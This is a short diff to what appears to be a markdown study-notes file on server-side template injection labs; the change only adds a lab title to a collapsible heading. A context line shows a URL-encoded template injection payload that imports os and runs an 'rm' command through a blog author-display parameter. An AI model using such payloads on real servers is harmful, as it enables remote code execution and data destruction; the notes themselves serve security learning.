@@ -1079,7 +1079,7 @@ blog-post-author-display=user.first_name}}{%25+import+os+%25}{{os.system('rm%20/
 
 
 <details>
-   <summary></summary>
+   <summary>Lab: Server-side template injection using documentation</summary>
 
 
 ## [Restriction bypass using ?lower_abc function](https://www.synack.com/exploits-explained/exploits-explained-discovering-a-server-side-template-injection-vuln-in-freemarker/) ✨👑
